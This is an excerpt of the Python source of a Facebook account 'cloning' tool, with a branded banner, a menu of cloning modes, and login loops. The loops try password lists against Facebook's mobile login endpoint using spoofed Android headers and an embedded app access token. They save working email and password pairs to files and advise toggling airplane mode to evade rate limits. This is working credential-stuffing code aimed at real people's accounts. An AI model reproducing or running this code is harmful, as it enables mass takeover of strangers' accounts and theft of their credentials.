...
\33[1;96m██   ██ ██   ██    ██    ██   ██
===============================================   
\33[1;97m[\33[1;92m+\33[1;37m] Creater  : Haya Fatima
\33[1;97m[\33[1;92m+\33[1;37m] Version :  0.1.2
\33[1;97m[\33[1;92m+\33[1;37m] GitHub   : SOON
\33[1;93m=============================================== \33[1;37m'''####@-----Menu-----@####

def Hxw_Main():
    os.system("clear")
    print(logo)
    print(f"\33[1;37m[1] File Cloning")
    print(f"[2] Pak Random Cloning")
    print(f"[3] Gmail Cloning")  
    print(f"[4] Owner Facebook ID")
    print(f"[0] Exit Program")
    inpp = input("[+] Choose an option : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Follow my Facebook ID ')
     os.system('https://www.facebook.com/profile.php?id=100087567536825')
     os.system('https://www.facebook.com/profile.php?id=100087567536825')
     exit()
    if inpp == "0":
     exit('Exit!')
...
def pak():
	user=[]
	code = input(f'{oo("!")}Input Your Code ? : ')
	try:
		limit = int(input(f'{oo("?")}Put Your Limit :  '))
	except ValueError:
		limit = 5000
...
def method():
    ...
    print(logo) 
    print('\033[1;93m='*50)
    print(f'{oo("✓")}Total Ids : \033[1;93m'+str(len(accounts)))
    print('\033[1;92m='*50)
    print("\33[1;93mTurn on & off flight (airplane) mode before use :)   ")
    print('\033[1;93m='*50)
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\rHAYA\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:        
            heads = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
            heads = "[FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
            ...
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text) 
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mHAYA-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m|\033[1;97m '+pword+'  ')
                open('/sdcard/HAYA-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;91mHAYA-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m|\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/HAYA-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHAYA-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/HAYA-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mHAYA-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/HAYA-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
